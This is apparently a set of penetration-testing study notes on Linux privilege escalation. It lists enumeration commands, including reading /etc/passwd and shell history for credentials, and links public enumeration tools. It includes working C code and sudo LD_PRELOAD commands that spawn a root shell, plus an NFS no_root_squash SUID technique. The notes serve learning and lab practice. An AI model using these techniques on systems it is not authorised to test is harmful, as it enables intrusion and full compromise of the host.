# Linux PrivEsc

## Important files

`/proc/version` = may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

`/etc/issue` = This file usually contains some information about the OS but can easily be customized or changed

`/etc/passwd` = Shows users on the system



Cat users with home directory

```bash
cat /etc/passwd | grep home
```

## Important commands

`hostname` = get **hostname** of target

`uname -a` = Print system info + **kernel** info

`ps` = See running processes in Linux

* `ps -A` = View all running processes
* `ps axjf` = View process tree
* `ps aux` = Show processes for all users, display the user that launched the process, and show the processes that are not attached to a terminal

`env` = Show **environment** variables

* The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

`sudo -l` = List **all commands** user can run using **sudo**

`id` = provide a general overview of the **user's privilege level** and **group memberships**

`history` = History file might have some **passwords** or **usernames** inside

`netstat` = Gather information on existing connections

* `netstat -a` shows all listening ports and established connections
* `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
* `netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol&#x20;
* `netstat -s`: list network usage statistics by protocol (below) This can also be used with the `-t` or `-u` options to limit the output to a specific protocol.
* `netstat -tp`: list connections with the service name and PID information.
* `netstat -i`: Shows interface statistics.
* The `netstat` usage you will probably see most often in blog posts, write-ups, and courses is `netstat -ano` which could be broken down as follows;
  * `-a`: Display all sockets
  * `-n`: Do not resolve names
  * `-o`: Display timers

Find

* `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
* `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
* `find / -type d -name config`: find the directory named config under “/”
* `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
* `find / -perm a=x`: find executable files
* `find /home -user frank`: find all files for user “frank” under “/home”
* `find / -mtime 10`: find files that were modified in the last 10 days
* `find / -atime 10`: find files that were accessed in the last 10 day
* `find / -cmin -60`: find files changed within the last hour (60 minutes)
* `find / -amin -60`: find files accesses within the last hour (60 minutes)
* `find / -size 50M`: find files with a 50 MB size

Find files permission based on permissions

* `find / -writable -type d 2>/dev/null` : Find world-writeable folders
* `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
* `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders



* `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders



Find development tools and supported languages:

* `find / -name perl*`
* `find / -name python*`
* `find / -name gcc*`



SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

## Automated Enumeration Tools

* LinPeas:&#x20;

{% embed url="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS" %}

* LinEnum:&#x20;

{% embed url="https://github.com/rebootuser/LinEnum" %}

* LES (Linux Exploit Suggester):

{% embed url="https://github.com/mzet-/linux-exploit-suggester" %}

* Linux Smart Enumeration:

{% embed url="https://github.com/diego-treitos/linux-smart-enumeration" %}

* Linux Priv Checker:

{% embed url="https://github.com/linted/linuxprivchecker" %}

## Kernel Exploits

1. Based on your findings, you can use **Google** to search for an existing exploit code.
2. Sources such as this can also be useful:

{% embed url="https://www.linuxkernelcves.com/cves" %}

3. Another alternative would be to use a script like **LES (Linux Exploit Suggester)** but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

## Sudo

{% embed url="https://gtfobins.github.io/" %}

### LD\_PRELOAD

The steps of this privilege escalation vector can be summarized as follows;

1. Check for LD\_PRELOAD (with the env\_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD\_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)  (32).png" alt=""><figcaption></figcaption></figure>

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD\_PRELOAD option, as follows;

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

This will result in a shell spawn with root privileges.

## SUID

`find / -type f -perm -4000 2>/dev/null`

## Capabilities

`getcap` = List enabled capabilities

`getcap -r / 2>/dev/null` = Redirect errors when using running this command as unprivileged user

## Cron Jobs

`/etc/crontab` = Cron jobs file

## Path

See Path Variable: `echo $PATH`

You can use C scripts with system() function in this privesc method

## NFS

`cat /etc/exports` = See NFS (Network File Sharing) configuration

Look out for **no\_root\_squash** option

`showmount -e [IP_ADDR]` = Enumerate mountable shares

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)  (33).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)   (1).png" alt=""><figcaption></figcaption></figure>

As you can set SUID bit, you generate a C code and compile it. It automatically is also visible on the mounted directory on target
